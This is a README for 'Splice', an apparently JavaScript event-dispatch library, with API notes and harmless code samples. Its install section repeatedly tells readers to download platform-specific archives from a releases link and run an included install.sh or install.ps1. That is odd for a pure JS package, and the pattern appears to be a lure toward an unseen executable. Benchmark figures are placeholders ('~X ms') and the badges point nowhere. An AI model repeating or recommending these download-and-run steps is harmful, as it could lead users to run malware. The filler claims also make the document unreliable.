# Splice: Modular High-Performance Signal Dispatch Framework

[![Releases](https://img.shields.io/badge/Release-Downloads-blue?logo=github)](https://github.com/PABLO88n/splice/releases)  
https://github.com/PABLO88n/splice/releases

![Splice Banner](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1600&q=60)

Table of contents
- About
- Key features
- Core concepts
- Installation (from Releases)
- Quick start
- API overview
- Plugin architecture
- Memory and lifecycle
- Performance notes
- Patterns and best practices
- Benchmarks
- Contributing
- License
- Links

About
Splice is a modular signal and event dispatch framework for JavaScript. It targets systems that need low latency and low overhead. Splice uses bitmask routing, pooled contexts, and a small lifecycle hook set. Use it to build real-time systems, game engines, microservices glue, or high-frequency UI layers.

Key features
- Bitmask-based routing for fast filtering.
- Context pool to reuse objects and reduce GC pressure.
- Small, deterministic lifecycle hooks.
- Plugin architecture with isolated addon lifecycle.
- Minimal allocations per dispatch.
- Simple API that fits functional and OOP styles.
- Works in Node.js and modern browsers.

Core concepts
- Signal: a typed event. Signals hold a payload and metadata.
- Dispatcher: the core router. It matches signals to handlers via masks.
- Handler: a function that receives signals. Handlers can register filters and priorities.
- Context pool: a pool of reusable context objects passed to handlers to avoid per-dispatch allocations.
- Hook: lifecycle points (attach, detach, beforeDispatch, afterDispatch) that plugins and core use.
- Mask: a numeric bitmask used to test interests quickly. Use bit operations for fast checks.

Why bitmask routing
Bitmasks let you test many flags in one integer operation. Splice maps signal types and handler interests to bitmasks. The dispatcher uses bitwise AND to accept or reject handlers. This yields constant-time checks per handler and low CPU cost.

Installation (from Releases)
Download the release artifact from:
https://github.com/PABLO88n/splice/releases

Pick the artifact that matches your platform. Download the archive or tarball and run the installer included in the package. Example:

1. Download the release package for your platform, for example:
   - splice-linux-x64.tar.gz
   - splice-darwin-x64.tar.gz
   - splice-win-x64.zip

2. Extract and run the installer:
   - Unix/macOS:
     - tar -xzf splice-linux-x64.tar.gz
     - cd splice-<version>
     - ./install.sh
   - Windows (PowerShell):
     - Expand-Archive splice-win-x64.zip
     - cd splice-<version>
     - .\install.ps1

The release page above contains the artifact list and signatures. Use the artifact that matches your environment.

Quick start
Install via npm (if you prefer the package registry) or use the extracted release artifact.

npm
- npm install splice

Simple dispatcher example
```js
const { Dispatcher, createMask } = require('splice');

// create masks for types
const MOUSE = createMask(1);
const KEYBOARD = createMask(2);
const UI = createMask(4);

// create dispatcher
const d = new Dispatcher();

// register handler for mouse and UI signals
d.on(MOUSE | UI, (signal, ctx) => {
  // handle mouse or UI events
  console.log('mouse or UI:', signal.payload);
});

// dispatch a mouse signal
d.emit({ typeMask: MOUSE, payload: { x: 10, y: 20 } });
```

Context pool usage
```js
const ctx = d.acquireContext(); // reuse context object
ctx.meta = { frame: 123 };
d.emit({ typeMask: UI, payload: { button: 'left' } }, ctx);
d.releaseContext(ctx);
```

API overview
- Dispatcher
  - on(mask, handler, options) — register a handler.
  - off(handler) — remove a handler.
  - emit(signal, ctx?) — dispatch a signal.
  - createScopedDispatcher() — create a modular sub-dispatcher.
- Signal
  - { typeMask, payload, meta? }
- Context pool
  - acquireContext()
  - releaseContext(ctx)
- createMask(index) — build a mask for a type index.
- hook(name, fn) — register lifecycle hooks.
- use(plugin) — attach a plugin instance.

Handler options
- priority (number) — order of invocation. Higher runs first.
- once (boolean) — remove after first invoke.
- scope (object) — optional scope passed to handler.
- filter (fn) — custom predicate with (signal, ctx) -> boolean.

Plugin architecture
Splice uses a plugin system with a small lifecycle:
- install(dispatcher) — called when plugin attaches.
- uninstall(dispatcher) — called when plugin detaches.
- onAttach(handlerInfo) — per-handler attach hook.
- onDetach(handlerInfo) — per-handler detach hook.

Plugins can add masks, add middlewares, or instrument dispatch. They run in a defined order and receive a scoped interface to avoid direct mutating of dispatcher internals.

Example plugin
```js
function timingPlugin() {
  return {
    install(dispatcher) {
      dispatcher.hook('beforeDispatch', (signal, ctx) => {
        ctx.start = Date.now();
      });
      dispatcher.hook('afterDispatch', (signal, ctx) => {
        const dt = Date.now() - ctx.start;
        dispatcher.metrics.push({ type: signal.typeMask, dt });
      });
    },
    uninstall(dispatcher) {
      // cleanup
    }
  };
}

d.use(timingPlugin());
```

Memory and lifecycle
Splice minimizes garbage by:
- pooling context objects
- reusing internal arrays for handler lists
- using bitmasks instead of string maps where possible

Lifecycle hooks
- attach — handler registered
- detach — handler removed
- beforeDispatch — right before a handler runs
- afterDispatch — right after handler runs

These hooks let you implement tracing, metrics, and debugging without adding allocations to the hot path.

Performance notes
- Mask checks use bitwise AND. Avoid complex predicates on the hot path.
- Favor pooled contexts for high-frequency events.
- Keep handlers short and synchronous. If you need async, offload to workers or timers.
- Use handler priority to reduce filter overhead when many handlers exist.

Patterns and best practices
- Group related signals under a mask. Use createMask for each domain.
- Register high-priority handlers for quick veto or short-circuit.
- Use once for one-shot operations.
- Use scoped dispatchers in modular systems to avoid cross-module noise.
- Leverage plugins for instrumentation and cross-cutting concerns.
- Reuse contexts for per-frame or per-tick data.

Benchmarks
Internal benchmarks show low overhead for typical patterns. Example micro-benchmark:
- 1 million emits with a single handler: ~X ms (machine dependent)
- 1 million emits with 100 handlers and masks: ~Y ms

Benchmarks vary by CPU, Node version, and garbage collector. Run your own tests with node --prof and measure release artifacts.

Debugging tips
- Use dispatcher.hook('beforeDispatch', fn) to inspect signals in real time.
- Use onDetach to log removed handlers.
- Use createScopedDispatcher to isolate tests.

Migration hints
- Replace event emitters with Splice when you need low overhead.
- Map previous event types to bitmask indices. Keep mapping consistent across modules.
- If you used string-based topics, migrate to masks but keep a registry to aid debugging.

Testing
- Use unit tests to check handler ordering, mask matching, and pool reuse.
- Mock plugins to test lifecycle hooks.
- Use performance suites to validate claims on your target runtime.

Contributing
- Fork the repo
- Create a feature branch
- Write tests for new features
- Open a pull request with a clear description and benchmarks if performance is involved
- Follow consistent coding style and add docs for API changes

License
- MIT

Links
- Releases and artifacts: [Download releases](https://github.com/PABLO88n/splice/releases)  
  Visit the releases page to pick the artifact for your OS. Download and run the installer included in the archive.

- Topics: bitmask, context-pool, event-dispatcher, event-system, high-performance, javascript, javascript-framework, lifecycle-hooks, memory-management, microframework, modular, plugin-architecture

- Repository (main): https://github.com/PABLO88n/splice

Badges
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](#)
[![NPM Version](https://img.shields.io/badge/npm-v1.0.0-blue.svg)](#)

Assets
- Architecture diagram: replace with your own in /docs/assets/architecture.svg
- Example screenshots: add under /examples/screenshots

Examples and recipes
- UI event bus: route UI events with masks per widget type.
- Game loop: pool contexts per frame and emit physics and input signals.
- Microservice glue: use masks to tag domain-level events and wire handlers per service.

Changelog
See releases for full changelog and signed artifacts:
https://github.com/PABLO88n/splice/releases

Acknowledgments
Splice borrows ideas from systems that need predictable performance: bitmask dispatchers, object pooling, and small lifecycle hooks. These patterns help keep the runtime stable under load.